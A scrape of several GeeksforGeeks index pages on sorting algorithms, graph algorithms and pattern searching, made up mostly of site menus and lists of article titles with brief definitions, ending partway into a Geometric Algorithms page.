Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Sorting Algorithms A Sorting Algorithm is used to rearrange a given array or list elements according to a comparison operator on the elements. The comparison operator is used to decide the new order of element in the respective data structure. For example: The below list of characters is sorted in increasing order of their ASCII values. That is, the character with lesser ASCII value will be placed first than the character with higher ASCII value. ‘Recent Articles’ on Sorting Topic : Basic Sorting Algorithms Library Implementations of Sorting Algorithms Misc Coding Problems Quick Links Basic : Sorting Terminology Stability in sorting algorithms Time complexities of Standard Sorting Algorithms External Sorting Sorting Algorithms : Selection Sort Bubble Sort Recursive Bubble Sort Insertion Sort Recursive Insertion Sort Merge Sort Iterative Merge Sort Quick Sort Iterative Quick Sort Heap Sort Counting Sort Radix Sort Bucket Sort ShellSort TimSort Comb Sort Pigeonhole Sort Cycle Sort Cocktail Sort Strand Sort Bitonic Sort Pancake sorting Binary Insertion Sort BogoSort or Permutation Sort Gnome Sort Sleep Sort – The King of Laziness / Sorting while Sleeping Structure Sorting (By Multiple Rules) in C++ Stooge Sort Tag Sort (To get both sorted and original) Tree Sort Cartesian Tree Sorting Odd-Even Sort / Brick Sort QuickSort on Singly Linked List QuickSort on Doubly Linked List 3-Way QuickSort (Dutch National Flag) Merge Sort for Linked Lists Merge Sort for Doubly Linked List 3-way Merge Sort Library Implementations of Sorting Algorithms : Know Your Sorting Algorithm | Set 1 (Sorting Weapons used by Programming Languages) Know Your Sorting Algorithm | Set 2 (Introsort- C++’s Sorting Weapon) Comparator function of qsort() in C sort() in C++ STL C qsort() vs C++ sort() Arrays.sort() in Java with examples Collections.sort() in Java with Examples Misc : Asymptotic Analysis and comparison of sorting algorithms Hoare’s vs Lomuto partition scheme in QuickSort Serial Sort v/s Parallel Sort in Java An Insertion Sort time complexity question Time complexity of insertion sort when there are O(n) inversions? Lower bound for comparison based sorting algorithms Which sorting algorithm makes minimum number of memory writes? When does the worst case of Quicksort occur? Can QuickSort be implemented in O(nLogn) worst case time complexity? QuickSort Tail Call Optimization (Reducing worst case space to Log n ) Why Quick Sort preferred for Arrays and Merge Sort for Linked Lists? Where is Heap Sort used practically? Find memory conflicts among multiple threads Coding Problems : Sort elements by frequency | Set 1 Sort elements by frequency | Set 2 Count Inversions in an array | Set 1 (Using Merge Sort) Sort an array of 0s, 1s and 2s Find the Minimum length Unsorted Subarray, sorting which makes the complete array sorted Find whether an array is subset of another array | Added Method 3 Sort a nearly sorted (or K sorted) array Sort numbers stored on different machines Sort a linked list of 0s, 1s and 2s A Pancake Sorting Problem Find number of pairs (x, y) in an array such that x^y > y^x Count all distinct pairs with difference equal to k C Program for Bubble Sort on Linked List Sort n numbers in range from 0 to n^2 – 1 in linear time C Program to Sort an array of names or strings Sort an array according to the order defined by another array Given a sorted array and a number x, find the pair in array whose sum is closest to x Sort an array in wave form Check if any two intervals overlap among a given set of intervals How to efficiently sort a big list dates in 20’s Sort an almost sorted array where only two elements are swapped Find the point where maximum intervals overlap Sort a linked list that is sorted alternating ascending and descending orders? C++ program for Sorting Dates using Selection Sort How to sort an array of dates in C/C++? Sorting Strings using Bubble Sort Maximum product of a triplet (subsequnece of size 3) in array Find missing elements of a range Find a permutation that causes worst case of Merge Sort Minimum sum of two numbers formed from digits of an array Find minimum difference between any two elements Convert an array to reduced form | Set 1 (Simple and Hashing) Sorting Vector of Pairs in C++ | Set 1 (Sort by first and second) Sorting Vector of Pairs in C++ | Set 2 (Sort in descending order by first and second) Sorting 2D Vector in C++ | Set 1 (By row and column) Sorting 2D Vector in C++ | Set 2 (In descending order by row and column) Sorting 2D Vector in C++ | Set 3 (By number of columns) Find Surpasser Count of each element in array Rearrange positive and negative numbers with constant extra space Sort an array according to count of set bits Count distinct occurrences as a subsequence Minimum number of swaps required to sort an array Number of swaps to sort when only adjacent swapping allowed Minimum swaps to make two arrays identical Find elements larger than half of the elements in an array Count minimum number of subsets (or subsequences) with consecutive numbers Sum of all elements between k1’th and k2’th smallest elements Number of sextuplets (or six values) that satisfy an equation Sort an array according to absolute difference with given value Minimize the sum of product of two arrays with permutations allowed Position of an element after stable sort Chocolate Distribution Problem Sort even-placed elements in increasing and odd-placed in decreasing order Permute two arrays such that sum of every pair is greater or equal to K Chose k array elements such that difference of maximum and minimum is minimized Sort an array when two halves are sorted Find pair with greatest product in array Minimum swap required to convert binary tree to binary search tree K-th smallest element after removing some integers from natural numbers Check whether Arithmetic Progression can be formed from the given array Bucket Sort To Sort an Array with Negative Numbers Possible to form a triangle from array values Maximum difference between frequency of two elements such that element having greater frequency is also greater Check if reversing a sub array make the array sorted Find all triplets with zero sum Sort a Matrix in all way increasing order Sort array after converting elements to their squares Sort all even numbers in ascending order and then sort all odd numbers in descending order Sorting Big Integers Sort an array of large numbers Sort 3 Integers without using if condition or using only max() function Minimum difference between max and min of all K-size subsets Minimum swaps to reach permuted array with at most 2 positions left swaps allowed Convert an array to reduced form | Set 2 (Using vector of pairs) Find sum of non-repeating (distinct) elements in an array Minimum sum of absolute difference of pairs of two arrays Find the largest multiple of 3 from array of digits | Set 2 (In O(n) time and O(1) space) Noble integers in an array (count of greater elements is equal to value) Find maximum height pyramid from the given array of objects Program to check if an array is sorted or not (Iterative and Recursive) Smallest Difference Triplet from Three arrays Smallest Difference pair of values between two unsorted Arrays Find whether it is possible to make array elements same using one external number Sort an array of strings according to string lengths Check if it is possible to sort an array with conditional swapping of adjacent allowed Sort an array after applying the given equation Print array of strings in sorted order without copying one string into another Sort elements on the basis of number of factors Quick Links : ‘Practice Problems’ on Sorting ‘Quizzes’ on Sorting If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Graph Data Structure And Algorithms - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Graph Data Structure And Algorithms Recent Articles on Graph A Graph is a non-linear data structure consisting of nodes and edges. The nodes are sometimes also referred to as vertices and the edges are lines or arcs that connect any two nodes in the graph. More formally a Graph can be defined as, A Graph consists of a finite set of vertices(or nodes) and set of Edges which connect a pair of nodes. In the above Graph, the set of vertices V = {0,1,2,3,4} and the set of edges E = {01, 12, 23, 34, 04, 14, 13}. Graphs are used to solve many real-life problems. Graphs are used to represent networks. The networks may include paths in a city or telephone network or circuit network. Graphs are also used in social networks like linkedIn, Facebook. For example, in Facebook, each person is represented with a vertex(or node). Each node is a structure and contains information like person id, name, gender, locale etc. Topics: Introduction, DFS and BFS Graph Cycle Topological Sorting Minimum Spanning Tree BackTracking Shortest Paths Connectivity Maximum Flow STL Implementation of Algorithms Hard Problems Misc Quick Links Introduction, DFS and BFS : Graph and its representations Breadth First Traversal for a Graph Depth First Traversal for a Graph Applications of Depth First Search Applications of Breadth First Traversal Graph representations using set and hash Find Mother Vertex in a Graph Transitive Closure of a Graph using DFS Find K cores of an undirected Graph Iterative Depth First Search Count the number of nodes at given level in a tree using BFS Count all possible paths between two vertices Minimum initial vertices to traverse whole matrix with given conditions Shortest path to reach one prime to other by changing single digit at a time Water Jug problem using BFS Count number of trees in a forest BFS using vectors & queue as per the algorithm of CLRS Level of Each node in a Tree from source node Construct binary palindrome by repeated appending and trimming Transpose graph Path in a Rectangle with Circles Height of a generic tree from parent array BFS using STL for competitive coding DFS for a n-ary tree (acyclic graph) represented as adjacency list Maximum number of edges to be added to a tree so that it stays a Bipartite graph A Peterson Graph Problem Implementation of Graph in JavaScript Print all paths from a given source to a destination using BFS Minimum number of edges between two vertices of a Graph Count nodes within K-distance from all nodes in a set Bidirectional Search Minimum edge reversals to make a root BFS for Disconnected Graph Move weighting scale alternate under given constraints Best First Search (Informed Search) Number of pair of positions in matrix which are not accessible Maximum product of two non-intersecting paths in a tree Delete Edge to minimize subtree sum difference Find the minimum number of moves needed to move from one cell of matrix to another Minimum steps to reach target by a Knight | Set 1 Minimum number of operation required to convert number x into y Minimum steps to reach end of array under constraints Find the smallest binary digit multiple of given number Roots of a tree which give minimum height Stepping Numbers Clone an Undirected Graph Sum of the minimum elements in all connected components of an undirected graph Check if two nodes are on same path in a tree A matrix probability question Find length of the largest region in Boolean Matrix Iterative Deepening Search(IDS) or Iterative Deepening Depth First Search(IDDFS) Graph Cycle : Detect Cycle in a Directed Graph Detect cycle in an undirected graph Detect cycle in a direct graph using colors Assign directions to edges so that the directed graph remains acyclic Detect a negative cycle in a Graph | (Bellman Ford) Cycles of length n in an undirected and connected graph Detecting negative cycle using Floyd Warshall Check if there is a cycle with odd weight sum in an undirected graph Check if a graphs has a cycle of odd length Clone a Directed Acyclic Graph Check loop in array according to given constraints Disjoint Set (Or Union-Find) | Set 1 Union-Find Algorithm | Set 2 Union-Find Algorithm | (Union By Rank and Find by Optimized Path Compression) Magical Indices in an array Topological Sorting : Topological Sorting All topological sorts of a Directed Acyclic Graph Kahn’s Algorithm for Topological Sorting Maximum edges that can be added to DAG so that is remains DAG Longest path between any pair of vertices Longest Path in a Directed Acyclic Graph Longest Path in a Directed Acyclic Graph | Set 2 Topological Sort of a graph using departure time of vertex Given a sorted dictionary of an alien language, find order of characters Minimum Spanning Tree : Prim’s Minimum Spanning Tree (MST)) Applications of Minimum Spanning Tree Problem Prim’s MST for Adjacency List Representation Kruskal’s Minimum Spanning Tree Algorithm Boruvka’s algorithm for Minimum Spanning Tree Minimum cost to connect all cities Steiner Tree Reverse Delete Algorithm for Minimum Spanning Tree Total number of Spanning Trees in a Graph Minimum Product Spanning Tree BackTracking : Find if there is a path of more than k length from a source Tug of War The Knight-Tour Problem Rat in a Maze n-Queen’s Problem m Coloring Problem Hamiltonian Cycle Permutation of numbers such that sum of two consecutive numbers is a perfect square Shortest Paths : Dijkstra’s shortest path algorithm Dijkstra’s Algorithm for Adjacency List Representation Bellman–Ford Algorithm Floyd Warshall Algorithm Johnson’s algorithm for All-pairs shortest paths Shortest Path in Directed Acyclic Graph Shortest path with exactly k edges in a directed and weighted graph Dial’s Algorithm Printing paths in Dijsktra’s Algorithm Shortest path of a weighted graph where weight is 1 or 2 Multistage Graph (Shortest Path) Shortest path in an unweighted graph Minimize the number of weakly connected nodes Betweenness Centrality (Centrality Measure) Comparison of Dijkstra’s and Floyd–Warshall algorithms Karp’s minimum mean (or average) weight cycle algorithm 0-1 BFS (Shortest Path in a Binary Weight Graph) Find minimum weight cycle in an undirected graph Minimum Cost Path with Left, Right, Bottom and Up moves allowed Minimum edges to reverse to make path from a src to a dest Find Shortest distance from a guard in a Bank Connectivity : Find if there is a path between two vertices in a directed graph Connectivity in a directed graph Articulation Points (or Cut Vertices) in a Graph Biconnected Components Biconnected graph Bridges in a graph Eulerian path and circuit Fleury’s Algorithm for printing Eulerian Path or Circuit Strongly Connected Components Transitive closure of a graph Find the number of islands Find the number of Islands | Set 2 (Using Disjoint Set) Count all possible walks from a source to a destination with exactly k edges Euler Circuit in a Directed Graph Count the number of non-reachable nodes Find the Degree of a Particular vertex in a Graph Check if a given graph is tree or not Minimum edges required to add to make Euler Circuit Eulerian Path in undirected graph Find if there is a path of more than k length Length of shortest chain to reach the target word Print all paths from a given source to destination Find minimum cost to reach destination using train Find if an array of strings can be chained to form a circle | Set 1 Find if an array of strings can be chained to form a circle | Set 2 Tarjan’s Algorithm to find strongly connected Components Number of loops of size k starting from a specific node Paths to travel each nodes using each edge (Seven Bridges of Königsberg) Number of cyclic elements in an array where we can jump according to value Number of groups formed in a graph of friends Minimum cost to connect weighted nodes represented as array Count single node isolated sub-graphs in a disconnected graph Calculate number of nodes between two vertices in an acyclic Graph by Disjoint Union method Dynamic Connectivity | Set 1 (Incremental) Check if a graph is strongly connected | Set 1 (Kosaraju using DFS) Check if a given directed graph is strongly connected | Set 2 (Kosaraju using BFS) Check if removing a given edge disconnects a graph Find all reachable nodes from every node present in a given set Connected Components in an undirected graph k’th heaviest adjacent node in a graph where each vertex has weight Maximum Flow : Ford-Fulkerson Algorithm for Maximum Flow Problem Find maximum number of edge disjoint paths between two vertices Find minimum s-t cut in a flow network Maximum Bipartite Matching Channel Assignment Problem Push Relabel- Set 1-Introduction Push Relabel- Set 2- Implementation Karger’s Algorithm- Set 1- Introduction and Implementation Karger’s Algorithm- Set 2 – Analysis and Applications Dinic’s algorithm for Maximum Flow Max Flow Problem Introduction STL Implementation of Algorithms : Kruskal’s Minimum Spanning Tree using STL in C++ Prim’s Algorithm using Priority Queue STL Dijkstra’s Shortest Path Algorithm using STL Dijkstra’s Shortest Path Algorithm using set in STL Graph implementation using STL for competitive programming | Set 2 (Weighted graph) Hard Problems : Graph Coloring (Introduction and Applications) Greedy Algorithm for Graph Coloring Traveling Salesman Problem (TSP) Implementation Travelling Salesman Problem (Naive and Dynamic Programming) Travelling Salesman Problem (Approximate using MST) Vertex Cover Problem | Set 1 (Introduction and Approximate Algorithm) K Centers Problem | Set 1 (Greedy Approximate Algorithm) Erdos Renyl Model (for generating Random Graphs) Clustering Coefficient in Graph Theory Chinese Postman or Route Inspection | Set 1 (introduction) Hierholzer’s Algorithm for directed graph Misc : Number of triangles in an undirected Graph Number of triangles in directed and undirected Graph Check whether a given graph is Bipartite or not Snake and Ladder Problem Minimize Cash Flow among a given set of friends who have borrowed money from each other Boggle (Find all possible words in a board of characters) Hopcroft Karp Algorithm for Maximum Matching-Introduction Hopcroft Karp Algorithm for Maximum Matching-Implementation Minimum Time to rot all oranges Find same contents in a list of contacts Hypercube Graph Check for star graph Optimal read list for a given number of days Print all jumping numbers smaller than or equal to a given value Fibonacci Cube Graph Barabasi Albert Graph (for Scale Free Models) Construct a graph from given degrees of all vertices Degree Centrality (Centrality Measure) Katz Centrality (Centrality Measure) Mathematics | Graph theory practice questions 2-Satisfiability (2-SAT) Problem Determine whether a universal sink exists in a directed graph Number of sink nodes in a graph Largest subset of Graph vertices with edges of 2 or more colors NetworkX : Python software package for study of complex networks Generate a graph using Dictionary in Python Count number of edges in an undirected graph Two Clique Problem (Check if Graph can be divided in two Cliques) Check whether given degrees of vertices represent a Graph or Tree Finding minimum vertex cover size of a graph using binary search Stable Marriage Problem Sum of dependencies in a graph Quick Links : Top 10 Interview Questions on Depth First Search (DFS) Some interesting shortest path questions Quizzes on Graph Traversal Quizzes on Graph Shortest Path Quizzes on Graph Minimum Spanning Tree Quizzes on Graphs Practice Problems on Graphs Videos on Graphs Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Pattern Searching - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Pattern Searching The Pattern Searching algorithms are sometimes also referred to as String Searching Algorithms and are considered as a part of the String algorithms. These algorithms are useful in the case of searching a string within another string. Recent article on Pattern Searching ! Topics : Algorithms Questions Algorithms : Naive Pattern Searching KMP Algorithm Rabin-Karp Algorithm A Naive Pattern Searching Question Finite Automata Efficient Construction of Finite Automata Boyer Moore Algorithm – Bad Character Heuristic Boyer Moore Algorithm | Good Suffix heuristic Aho-Corasick Algorithm for Pattern Searching Suffix Array kasai’s Algorithm for Construction of LCP array from Suffix Array Z algorithm (Linear time pattern searching Algorithm) Online algorithm for checking palindrome in a stream Manacher’s Algorithm – Linear Time Longest Palindromic Substring – Part 4 Ukkonen’s Suffix Tree Construction – Part 1 Ukkonen’s Suffix Tree Construction – Part 2 Ukkonen’s Suffix Tree Construction – Part 3 Ukkonen’s Suffix Tree Construction – Part 4 Ukkonen’s Suffix Tree Construction – Part 5 Ukkonen’s Suffix Tree Construction – Part 6 Generalized Suffix Tree 1 Questions : Anagram Substring Search (Or Search for all permutations) Pattern Searching using a Trie of all Suffixes Program to wish Women’s Day Program to replace a word with asterisks in a sentence Dynamic Programming | Wildcard Pattern Matching | Linear Time and Constant Space Pattern Searching using C++ library Longest prefix which is also suffix Splitting a Numeric String Count of number of given string in 2D character array Find minimum shift for longest common prefix Find all the patterns of “1(0+)1” in a given string | SET 1(General Approach) Find all the patterns of “1(0+)1” in a given string | SET 2(Regular Expression Approach) is_permutation() in C++ and its application for anagram search Match Expression where a single special character in pattern can match one or more characters Maximum length prefix of one string that occurs as subsequence in another Wildcard Pattern Matching Find all occurrences of a given word in a matrix Search a Word in a 2D Grid of characters String matching where one string contains wildcard characters Suffix Tree Application 1 – Substring Check Suffix Tree Application 2 – Searching All Patterns Suffix Tree Application 3 – Longest Repeated Substring Suffix Tree Application 4 – Build Suffix Array Suffix Tree Application 5 -Longest Common Substring Suffix Tree Application 6 – Longest Palindromic Substring My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Geometric Algorithms - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve 